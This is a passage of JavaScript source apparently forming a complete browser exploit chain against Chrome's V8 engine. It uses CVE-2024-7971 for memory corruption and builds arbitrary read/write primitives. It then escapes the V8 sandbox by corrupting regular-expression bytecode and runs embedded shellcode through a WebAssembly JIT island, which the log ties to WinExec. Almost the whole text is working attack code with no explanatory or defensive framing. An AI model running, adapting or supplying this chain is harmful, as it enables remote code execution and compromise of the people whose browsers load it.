        SANDBOX_BASE = addrOf64([13.37, 13.37]) & ~0xffffffffn;
        log("[+] Leaked SANDBOX_BASE=0x" + hex(SANDBOX_BASE), 2);
    }


    let test_arr = [13.37, 13.37];
    assert(fakeObj(addrOf(test_arr)) === test_arr, "[-] Failed to exploit CVE-2024-7971");
    log("[+] Successfully achieved memory corruption using CVE-2024-7971", 1);
}

{
    log("[i] Crafting sbxMemory dataview & stage-2 primitives", 1);


    let spray_arr = () => {
        let arr = [];
        for (let i = 0; i < 1000; i++) {
            arr.push([13.37, 13.37]);
        }
        return arr;
    }

    let sprayed_arr = spray_arr();
    let faker = sprayed_arr[500].fill(bi2f(0n));
    majorGC();

    let faker_addr = addrOf(faker);
    assert(isStrongTaggedPtr(faker_addr), "[-] Invalid pointer returned by stage-1 addrOf(): 0x" + hex(faker_addr));

    faker.fill(i2f(faker_addr, faker_addr));
    let fake_num = fakeObj(faker_addr-0x04);
    let fake_obj = fakeObj(faker_addr-0x10);


    let kHeapNumberMap = 1;
    let is_number = (obj) => typeof obj === "number";

    if (FINGERPRINT.platform.bitness === "32")
        kHeapNumberMap += (addrOf(null) & ~0xffff);

    const max_kmap = kHeapNumberMap + 0x5000;
    while (kHeapNumberMap <= max_kmap && !is_number(fake_num)) {
        kHeapNumberMap += 4;
        faker[1] = i2f(0x0, kHeapNumberMap);
    }

    assert(is_number(fake_num), "[-] Failed to find kHeapNumberMap (probably due to an unexpected JSArray memory layout)");
    log("[+] Found kHeapNumberMap: 0x" + hex(kHeapNumberMap), 2);


    let floatarr_headers = f2bi(fake_num);
    log("[+] Found float array headers: 0x" + hex(floatarr_headers), 2);


    let sbx_buf = new ArrayBuffer(0, {maxByteLength: 0});
    let sbx_buf_addr = addrOf(sbx_buf);
    let sbx_buf_struct = new STRUCTS.JSArrayBuffer(sbx_buf_addr - 0x8);


    faker[0] = bi2f(floatarr_headers);

    if (FINGERPRINT.platform.bitness === "32") {
        faker[1] = i2f(Number(tagPtr(sbx_buf_struct.byte_length)), 1<<1);
        fake_obj[0] = -Number.MAX_VALUE;

        faker[1] = i2f(Number(tagPtr(sbx_buf_struct.backing_store)), 1<<1);
        fake_obj[0] = bi2f(f2bi(fake_obj[0]) & 0xffffffff00000000n);

    } else {
        faker[1] = i2f(Number(tagPtr(sbx_buf_struct.byte_length)), 1<<1);
        fake_obj[0] = -Number.MAX_VALUE;

        faker[1] = i2f(Number(tagPtr(sbx_buf_struct.max_byte_length)), 1<<1);
        fake_obj[0] = -Number.MAX_VALUE;

        faker[1] = i2f(Number(tagPtr(sbx_buf_struct.backing_store)), 1<<1);
        fake_obj[0] = bi2f(0x0n);
    }


    let sbx_bufs = [sbx_buf];
    let sbx_dataviews = [new DataView(sbx_buf)];

    const buf_max_size = 0x7ffffffff;
    const buf_partition = buf_max_size - 8;
    let craftBuffer = (i) => {
        if (FINGERPRINT.platform.bitness === "32") return;
        if (typeof sbx_bufs[i] === "undefined") sbx_bufs[i] = new ArrayBuffer(0, {maxByteLength: 0});
        let sbx_buf_i = new STRUCTS.JSArrayBuffer(addrOf(sbx_bufs[i]));
        sbx_dataviews[0].setBigUint64(Number(sbx_buf_i.byte_length), BigInt(buf_max_size) << 29n, true);
        sbx_dataviews[0].setBigUint64(Number(sbx_buf_i.max_byte_length), BigInt(buf_max_size) << 29n, true);
        sbx_dataviews[0].setBigUint64(Number(sbx_buf_i.backing_store), BigInt(i*buf_partition) << (3n*8n), true);
        sbx_dataviews[i] = new DataView(sbx_bufs[i]);
    }
    craftBuffer(0);

    let dataviewProxy = (name) => {
        return (addr, ...args) => {
            addr = Number(addr);
            assert(FINGERPRINT.platform.bitness !== "32" || addr < 0xffffffff, "[-] Invalid 32-bit target address");
            assert(addr < 2**40 && addr >= 0, "[-] Target address is outside the sandbox");

            let i = Math.floor(addr / buf_partition);
            let ofs = addr % buf_partition;

            if (typeof sbx_dataviews[i] === "undefined") craftBuffer(i);

            return sbx_dataviews[i][name](ofs, ...args);
        }
    }

    var sbxMemory = {};
    for (let method of Object.getOwnPropertyNames(DataView.prototype)) {
        if (method.startsWith("get") || method.startsWith("set")) {
            sbxMemory[method] = dataviewProxy(method);
        }
    }
    log("[+] Successfully crafted sbxMemory dataview", 2);


    faker[0] = i2f(kHeapNumberMap, kHeapNumberMap);
    faker[1] = i2f(kHeapNumberMap, kHeapNumberMap);
    fake_obj = null;
    fake_num = null;


    faker["obj"] = {};
    sbxMemory.setUint32(untagPtr(faker_addr)+0x4, faker_addr-0x18, true);


    addrOf = (obj) => {
        faker["obj"] = obj;
        return f2il(faker[0]);
    }

    fakeObj = (addr) => {
        faker[0] = i2f(addr, kHeapNumberMap);
        return faker["obj"];
    }

    log("[+] Successfully bootstrapped stage-2 addrOf() & fakeObj() primitives", 2);

{
    const POP_REGISTER = 12, SET_REGISTER = 8, PUSH_BT = 2, PUSH_REGISTER = 3,
          SET_CP_TO_REGISTER = 5, SET_REGISTER_TO_CP = 4, ADVANCE_REGISTER = 9,
          SET_SP_TO_REGISTER = 7, SUCCEED = 14, FAIL = 13, GOTO = 16,
          CHECK_REGISTER_LT = 44, CHECK_REGISTER_GE = 45, CHECK_LT = 35;
    function rd32(o) { return sbxMemory.getUint32(o, true); }
    function wr32(o, v) { sbxMemory.setUint32(o, v >>> 0, true); }
    function hx(v) { return "0x" + (typeof v === "bigint" ? v.toString(16) : (v >>> 0).toString(16)); }
    const CAGE_HI = SANDBOX_BASE + 0x10000000000n;
    function Asm() {
        let out = [], labels = {}, fix = [];
        return {
            at(name) { labels[name] = out.length * 4; },
            raw(...ds) { for (let d of ds) out.push(d >>> 0); },
            jump(op, reg, val, label) { out.push((op | (reg << 8)) >>> 0, val >>> 0, 0); fix.push([out.length - 1, label]); },
            jumpPacked(op, packed, label) { out.push((op | (packed << 8)) >>> 0, 0); fix.push([out.length - 1, label]); },
            goto(label) { out.push(GOTO, 0); fix.push([out.length - 1, label]); },
            pos() { return out.length; },
            patch(i, v) { out[i] = v >>> 0; },
            build() { for (let [i, l] of fix) out[i] = labels[l] >>> 0; return out; }
        };
    }
    function prologueRel(a) {
        a.raw(POP_REGISTER | (0 << 8), POP_REGISTER | (0 << 8),
              POP_REGISTER | (0 << 8), POP_REGISTER | (0 << 8),
              POP_REGISTER | (3 << 8), POP_REGISTER | (4 << 8));
        a.raw(SET_CP_TO_REGISTER | (4 << 8));
        a.raw(SET_REGISTER_TO_CP | (5 << 8), 0);
        a.raw(ADVANCE_REGISTER | (5 << 8), (-12) >>> 0);
        a.raw(PUSH_REGISTER | (4 << 8));
        a.raw(PUSH_REGISTER | (3 << 8));
        a.raw(PUSH_REGISTER | (5 << 8));
        a.raw(PUSH_REGISTER | (3 << 8));
        a.raw(SET_CP_TO_REGISTER | (4 << 8));
        a.raw(SET_REGISTER_TO_CP | (5 << 8), 0);
        a.raw(ADVANCE_REGISTER | (5 << 8), 0x100000);
        a.raw(SET_CP_TO_REGISTER | (3 << 8));
        a.raw(SET_REGISTER_TO_CP | (6 << 8), 0);
        a.jump(CHECK_REGISTER_LT, 4, 0, "carry_maybe");
        a.goto("nocarry");
        a.at("carry_maybe");
        a.jump(CHECK_REGISTER_LT, 4, -0x100000, "nocarry");
        a.raw(ADVANCE_REGISTER | (6 << 8), 1);
        a.at("nocarry");
        a.raw(PUSH_REGISTER | (5 << 8));
        a.raw(PUSH_REGISTER | (6 << 8));
    }
    function emitSetSp(a, n) {
        a.raw(SET_REGISTER | (7 << 8), n >>> 0);
        a.raw(SET_SP_TO_REGISTER | (7 << 8));
    }
    function progReadRel(off) {
        let a = Asm();
        prologueRel(a);
        emitSetSp(a, (off / 4) + 1);
        a.raw(POP_REGISTER | (2 << 8));
        a.raw(SET_CP_TO_REGISTER | (2 << 8));
        a.raw(SET_REGISTER_TO_CP | (0 << 8), 0);
        a.raw(SET_REGISTER_TO_CP | (1 << 8), 0);
        a.raw(SUCCEED);
        return a.build();
    }
    function progWriteRel(off, vals, tail) {
        let a = Asm();
        prologueRel(a);
        emitSetSp(a, off / 4);
        for (let v of vals) a.raw(PUSH_BT, v >>> 0);
        if (tail) for (let t of tail) a.raw(t);
        else a.raw(SET_REGISTER | (0 << 8), 0, SET_REGISTER | (1 << 8), 0);
        a.raw(SUCCEED);
        return a.build();
    }
    let pat = "A(?:(?:BC){1,3}D){2,4}" + "E".repeat(150);
    let re = new RegExp(pat);
    try { re.exec("zzzzzzzzzzzzzzzz"); } catch (e) {}
    for (let g = 0; g < 3; g++) majorGC();
    function getBC() {
        let readdr = addrOf(re) & ~1;
        let data = rd32(readdr + 0xC) & ~1;
        wr32(data + 8 + 4 * 10, 0x20000);
        wr32(data + 8 + 4 * 7, 64 << 1);
        return rd32(data + 8 + 4 * 5) & ~1;
    }
    var curProg = null;
    function writeBC(dwords) {
        let bc = getBC();
        for (let i = 0; i < dwords.length; i++) wr32(bc + 8 + 4 * i, dwords[i] >>> 0);
        curProg = dwords;
    }
    function run(prog) {
        if (prog !== curProg) writeBC(prog);
        let m;
        try { m = re.exec("ABCDEFGH"); } catch (e) { return null; }
        return (m === null) ? null : (m.index >>> 0);
    }
    function runPatch(prog, patches) {
        if (prog !== curProg) writeBC(prog);
        let bc = getBC();
        for (let [i, v] of patches) wr32(bc + 8 + 4 * i, v >>> 0);
        let m;
        try { m = re.exec("ABCDEFGH"); } catch (e) { return null; }
        return (m === null) ? null : (m.index >>> 0);
    }
    const LFIX2 = [SET_CP_TO_REGISTER | (2 << 8), SET_REGISTER_TO_CP | (0 << 8), 0, SET_REGISTER_TO_CP | (1 << 8), 0];
    let hi1 = run([POP_REGISTER | (2 << 8)].concat(LFIX2, [SUCCEED]));
    let lo1 = run([POP_REGISTER | (2 << 8), POP_REGISTER | (2 << 8)].concat(LFIX2, [SUCCEED]));
    let B = ((BigInt(hi1) << 32n) | BigInt(lo1)) - 256n;
    let subjDataPtr = SANDBOX_BASE + BigInt(addrOf("ABCDEFGH") & ~1) + 0xCn;
    log("[leak] B = " + hx(B), -1);
    let rrCache = new Map();
    function readRel(off) {
        let p = rrCache.get(off);
        if (!p) { p = progReadRel(off); rrCache.set(off, p); }
        return run(p);
    }
    function readRelQ(off) {
        let lo = readRel(off), hi = readRel(off + 4);
        if (lo === null || hi === null) return null;
        return (BigInt(hi) << 32n) | BigInt(lo);
    }
    let SUBJ_OFF = (typeof process !== "undefined" && process.argv && process.argv[2]) ? parseInt(process.argv[2]) : 0x310, OUTREG_OFF = 0x220;
    log("[probe] SUBJ_OFF=0x" + SUBJ_OFF.toString(16), -1);
    log("[*] SUBJ_OFF=0x" + SUBJ_OFF.toString(16) + " OUTREG_OFF=0x" + OUTREG_OFF.toString(16) + " matchInfo=" + hx(readRelQ(OUTREG_OFF)), -1);

    function emitTree(a, depth, lo) {
        if (depth === 8) {
            a.raw(SET_REGISTER | (0 << 8), lo);
            a.raw(SET_CP_TO_REGISTER | (0 << 8));
            a.raw(SET_REGISTER_TO_CP | (1 << 8), 0);
            a.raw(SUCCEED);
            return;
        }
        let mid = lo + (1 << (7 - depth));
        let lL = "L" + depth + "_" + lo;
        a.jumpPacked(CHECK_LT, mid, lL);
        emitTree(a, depth + 1, lo + (1 << (7 - depth)));
        a.at(lL);
        emitTree(a, depth + 1, lo);
    }
    function progFarByte(base, pos) {
        let a = Asm();
        prologueRel(a);
        emitSetSp(a, SUBJ_OFF / 4);
        a.raw(PUSH_BT, Number(base & 0xffffffffn));
        a.raw(PUSH_BT, Number((base >> 32n) & 0xffffffffn));
        a.raw(SET_REGISTER | (8 << 8), 0, SET_CP_TO_REGISTER | (8 << 8));
        let lp = a.pos();
        a.raw(17 | (Number(pos) << 8), 0);
        emitTree(a, 0, 0);
        a.at("L_fail");
        a.raw(SET_REGISTER | (0 << 8), 0xEE, SET_CP_TO_REGISTER | (0 << 8), SET_REGISTER_TO_CP | (1 << 8), 0, SUCCEED);
        let prog = a.build();
        prog[lp + 1] = (prog.length - 6) * 4;
        return prog;
    }
    let treeProg = null, treeIdx = null;
    function buildTreeOnce() {
        let a = Asm();
        prologueRel(a);
        emitSetSp(a, SUBJ_OFF / 4);
        let bi = a.pos();
        a.raw(PUSH_BT, 0, PUSH_BT, 0);
        a.raw(SET_REGISTER | (8 << 8), 0, SET_CP_TO_REGISTER | (8 << 8));
        let lp = a.pos();
        a.raw(17, 0);
        emitTree(a, 0, 0);
        a.at("L_fail");
        a.raw(SET_REGISTER | (0 << 8), 0xEE, SET_CP_TO_REGISTER | (0 << 8), SET_REGISTER_TO_CP | (1 << 8), 0, SUCCEED);
        let prog = a.build();
        prog[lp + 1] = (prog.length - 6) * 4;
        treeProg = prog;
        treeIdx = { baseLo: bi + 1, baseHi: bi + 3, load: lp };
    }
    function farByte(base, pos) {
        if (treeProg === null) buildTreeOnce();
        return runPatch(treeProg, [
            [treeIdx.baseLo, Number(base & 0xffffffffn)],
            [treeIdx.baseHi, Number((base >> 32n) & 0xffffffffn)],
            [treeIdx.load, 17 | (Number(pos) << 8)]]);
    }
    function farQ(base) {
        let v = 0n;
        for (let i = 0; i < 8; i++) v |= BigInt(farByte(base, i)) << BigInt(8 * i);
        return v;
    }
    let ctl = [];
    let tc = Date.now();
    for (let i = 0; i < 8; i++) ctl.push(farByte(subjDataPtr, i).toString(16));
    log("[control] tree far-read = " + ctl.join(" ") + " (" + (Date.now() - tc) + "ms for 8)", -1);

    let freq = new Map();
    let t0 = Date.now();
    for (let off = 0x100; off <= 0x600; off += 8) {
        let q = readRelQ(off);
        if (q === null || q < 0x100000n) continue;
        if (q >= SANDBOX_BASE && q < CAGE_HI) continue;
        if ((q & 7n) !== 0n) continue;
        freq.set(q, (freq.get(q) || 0) + 1);
    }
    log("[*] ID scan took " + (Date.now() - t0) + "ms, cands=" + freq.size, -1);
    let ID = 0n;
    for (let [q, n] of [...freq.entries()].sort((a, b) => b[1] - a[1])) {
        if (q < 0x100000000n || q > 0x7fffffffffffn) continue;
        if (q >= SANDBOX_BASE && q < CAGE_HI) continue;
        log("[probe] trying q=" + hx(q) + " freq=" + n, -1);
        if (farQ(q) !== SANDBOX_BASE) continue;
        ID = q;
        log("[1] IsolateData = " + hx(ID) + " (freq x" + n + ")", -1);
        break;
    }
    if (ID === 0n) { log("[-] IsolateData not found in window, retry", -1); throw new Error("ID-NOT-FOUND"); }
    log("[1] IsolateData = " + hx(ID), -1);
    let TCB = farQ(ID + 0x250n), TPT = farQ(ID + 0x258n);
    log("[1] trusted_cage_base = " + hx(TCB) + "  TPT.base = " + hx(TPT), -1);

    const IMMS = [0x2eb0000441f0f53n,0x5eb00401f0fc031n,0x5eb9060408b4865n,0x5eb909018408b48n,0x5eb909020408b48n,0x5eb001f0f008b48n,0x5eb909000408b48n,0x5eb909020588b48n,0x5eb001f0f3c438bn,0x5eb909003048d4cn,0x5eb909078c08349n,0x5eb909010408b41n,0x5eb906603048d4cn,0x5eb90901c488b45n,0x5eb909020508b45n,0x5eb909024588b45n,0x5eb001f0fd90149n,0x5eb001f0fda0149n,0x5eb001f0fdb0149n,0x5eb00401f0fc931n,0x5eb90908a3c8b41n,0x5eb001f0fdf0148n,0x5eb456e69573f81n,0x5eb00401f0f3275n,0x5eb001f0f04478bn,0x5eb90006365783dn,0x5eb00401f0f2574n,0x5eb001f0fc1ff48n,0x5eb00401f0f96ebn,0x5eb90909090c031n,0x5eb904b048b4166n,0x5eb909081048b41n,0x5eb001f0fd80148n,0x5eb001f0fc08949n,0x5eb5900000000e8n,0x5eb9000000126bbn,0x5eb001f0fcb0148n,0x5eb001f0fd98949n,0x5eb001f0fdb8949n,0x5eb900000000ab9n,0x5eb001f0f118b4dn,0x5eb001f0f13894dn,0x5eb90900dc18349n,0x5eb909006c38349n,0x5eb00401f0fc9ffn,0x5eb00401f0fbd75n,0x5eb001f0fd98948n,0x5eb9000000000ban,0x5eb00401f0f5441n,0x5eb001f0fe48949n,0x5eb9090f0e48348n,0x5eb909020ec8348n,0x5eb001f0fd0ff41n,0x5eb001f0fe4894cn,0x5eb00401f0f5c41n,0x5eb0000441f0f5bn,0x5eb0000441f0fc3n,0x1632f20646d63n,0x220636c616320n,0x36f6863652026n,0x44f5f45435220n,0x5575c3a433e4bn,0x673776f646e69n,0x75c706d65545cn,0x8726568736966n,0x9742e6563725fn,0xa000000007478n];
    const IMM0_DELTA = 0xa1an;
    let builder = new WasmModuleBuilder();
    let sigIdx = builder.addType(makeSig([], [kWasmI64]));
    builder.addImport("js", "f", sigIdx);
    let m0body = [];
    for (let i = 0; i < IMMS.length; i++) {
        m0body.push(...wasmI64Const(IMMS[i]));
        if (i > 0) m0body.push(0x7c);
    }
    builder.addFunction("m0", sigIdx).addBody(m0body).exportFunc();
    for (let i = 1; i < 14; i++) {
        builder.addFunction("m" + i, sigIdx)
            .addBody([...wasmI64Const(0x100000000n + BigInt(i)), kExprDrop, ...wasmI64Const(BigInt(i))])
            .exportFunc();
    }
    builder.addFunction("go", sigIdx).addBody([kExprCallFunction, 0x00]).exportFunc();
    let inst = builder.instantiate({js: {f: () => 0n}});
    for (let i = 0; i < 14; i++) { try { inst.exports["m" + i](); } catch (e) {} }
    try { inst.exports.go(); } catch (e) {}
    globalThis.__island_inst = inst;
    let instOfs = BigInt(addrOf(inst) & ~1);
    let handle = rd32(Number(instOfs) + 0xC);
    log("[S1] wasm inst handle=0x" + handle.toString(16), -1);
    let TID = 0n;
    {
        let idx = handle >>> 9;
        let entry = farQ(TPT + BigInt(idx) * 8n);
        TID = (entry & 0xffffffffffffn) & ~1n;
        log("[S1] TPT entry=" + hx(entry) + " TID=" + hx(TID), -1);
    }
    let jts = farQ(TID + 0x48n);
    let island = jts + IMM0_DELTA;
    log("[S2] TID=" + hx(TID) + " jts=" + hx(jts) + " island=" + hx(island), -1);
    log("[S2] island bytes: " + hx(farQ(island)) + " " + hx(farQ(island + 8n)) + " (expect ..53 90 90 90 90 90 eb 02..)", -1);
    {
        let qt = [];
        for (let d = 0; d < 0x80; d += 8) qt.push(farQ(jts + BigInt(d)));
        let byteAt = (o) => Number((qt[o >> 3] >> BigInt((o & 7) * 8)) & 0xffn);
        let i32At = (o) => { let v = 0; for (let k = 0; k < 4; k++) v |= byteAt(o + k) << (8 * k); return v | 0; };
        let targets = [];
        for (let o = 0; o < 0x7b; o++) {
            if (byteAt(o) === 0xe9) {
                let t = o + 5 + i32At(o + 1);
                if (t > 0 && t < 0x8000 && !targets.includes(t)) targets.push(t);
            }
        }
        log("[S2] slots: " + targets.map(t => "0x" + t.toString(16)).join(" "), -1);
        let sig = [0x53n, 0x0fn, 0x1fn, 0x44n, 0x00n, 0x00n, 0xebn, 0x02n];
        let found = false;
        for (let ti = 0; ti < targets.length && !found; ti++) {
            let t = targets[ti];
            for (let d = 0; d <= 0x80 && !found; d += 4) {
                let v = farQ(jts + BigInt(t + d));
                let hit = false;
                for (let k = 0n; k <= 4n; k++) { if (((v >> (k * 8n)) & 0xffffffffn) === 0x441fn) { hit = true; break; } }
                if (!hit) continue;
                for (let s = t + d - 4; s <= t + d + 8; s++) {
                    let ok = true;
                    for (let j = 0; j < 8; j++) {
                        if (BigInt(farByte(jts + BigInt(s + j), 0)) !== sig[j]) { ok = false; break; }
                    }
                    if (ok) { island = jts + BigInt(s); log("[S2] ISLAND FOUND @jts+0x" + s.toString(16), -1); found = true; break; }
                }
            }
        }
        if (!found) log("[S2] island NOT found via slots, fallback delta", -1);
        log("[S2] island final = " + hx(island), -1);
    }

    function progFarWrite(target, lo, hi) {
        let a = Asm();
        prologueRel(a);
        emitSetSp(a, OUTREG_OFF / 4);
        a.raw(PUSH_BT, Number(target & 0xffffffffn));
        a.raw(PUSH_BT, Number((target >> 32n) & 0xffffffffn));
        a.raw(SET_REGISTER | (0 << 8), lo >>> 0);
        a.raw(SET_REGISTER | (1 << 8), hi >>> 0);
        a.raw(SUCCEED);
        return a.build();
    }

    let ftRaw = Number(farQ(TID + 0x1Cn) & 0xffffffffn);
    let sbxArr = ftRaw & ~1;
    let oldTgt = sbxMemory.getBigUint64(sbxArr + 8, true);
    log("[S3] imported_function_targets@sbx+0x" + sbxArr.toString(16) + " entry0: " + hx(oldTgt) + " -> " + hx(island), -1);
    sbxMemory.setBigUint64(sbxArr + 8, island, true);
    let rb = sbxMemory.getBigUint64(sbxArr + 8, true);
    log("[S4] call_target readback = " + hx(rb) + (rb === island ? "  MATCH" : "  MISMATCH!"), -1);
    let fret = 0n;
    try { fret = inst.exports.go(); } catch (e) { log("[S4] go() threw: " + e, -1); }
    log("[S4] go() returned 0x" + fret.toString(16) + " (WinExec code, >32 = success)", -1);
    log("EXP-FULL-DONE", -1);
}


    


    if (FINGERPRINT.platform.bitness === "32") {
        function arbRead(addr) {
            return sbxMemory.getBigUint64(addr, true);
        }

        function arbWrite(addr, val) {
            return sbxMemory.setBigUint64(addr, val, true);
        }

        log("[+] V8 Sandbox is disabled on 32-bit architectures: successfully crafted arbRead() & arbWrite()", 2);
    }


    let sbxMemoryCleaner = () => {
        if (typeof sbxMemory !== "undefined") {
            if (FINGERPRINT.platform.bitness === "32") return;

            let sbx = sbx_dataviews[0];
            let buf_struct = new STRUCTS.JSArrayBuffer();

            for (let i = 1; i < sbx_dataviews.length; i++) {
                if (typeof(sbx_dataviews[i]) !== "undefined") {
                    let sbx_buf_i = new STRUCTS.JSArrayBuffer(addrOf(sbx_dataviews[i].buffer));
                    sbx.setBigUint64(Number(sbx_buf_i.byte_length), 0x0n << 29n, true);
                    sbx.setBigUint64(Number(sbx_buf_i.max_byte_length), 0x0n << 29n, true);
                    sbx.setBigUint64(Number(sbx_buf_i.backing_store), 0xffffffffffn << (3n*8n), true);
                    sbx_dataviews[i].buffer.transfer();
                }
            }

            let dummy_length = Number(buf_struct.backing_store) + 8;
            let dummy = new ArrayBuffer(dummy_length);
            let dummy_buf = new STRUCTS.JSArrayBuffer(addrOf(dummy));
            let dummy_backing_store = sbx.getBigUint64(Number(dummy_buf.backing_store), true);

            sbx.setBigUint64(Number(dummy_buf.byte_length), 0x0n << 29n, true);
            sbx.setBigUint64(Number(dummy_buf.max_byte_length), 0x0n << 29n, true);
            sbx.setBigUint64(Number(dummy_buf.backing_store), 0xffffffffffn << (3n*8n), true);

            let faker_addr = addrOf(faker);
            let sbx_buf_addr = addrOf(sbx.buffer);
            assert(isStrongTaggedPtr(faker_addr) && isStrongTaggedPtr(sbx_buf_addr), "[-] Invalid pointer retrieved during memory cleaning");

            sbx.setBigUint64(untagPtr(faker_addr), floatarr_headers, true);

            sbx.setBigUint64(untagPtr(sbx_buf_addr) + Number(buf_struct.backing_store), BigInt(untagPtr(sbx_buf_addr)) << (3n*8n), true);
            sbx.setBigUint64(Number(buf_struct.byte_length), BigInt(dummy_length) << 29n, true);
            sbx.setBigUint64(Number(buf_struct.max_byte_length), BigInt(dummy_length) << 29n, true);
            sbx.setBigUint64(Number(buf_struct.backing_store), dummy_backing_store, true);

            sbx_bufs = [];
            sbx_dataviews = [];
            sbxMemory = null;

            log("[+] Successfully cleaned stage-2 primitives", 1);
        }
    }


    clean("stage1");
    cleaner(sbxMemoryCleaner, "stage2");
}



    log("[i] Exploit chain done, exit cleanly", -1);
    try { clean(); } catch(e) {}
    if (typeof window.__pwn_done === "function") window.__pwn_done();
} catch (err) {
    log("CHAIN-ERROR " + (err && err.message ? err.message : String(err)), -1);
    if (typeof window.__pwn_retry === "function") window.__pwn_retry();
}

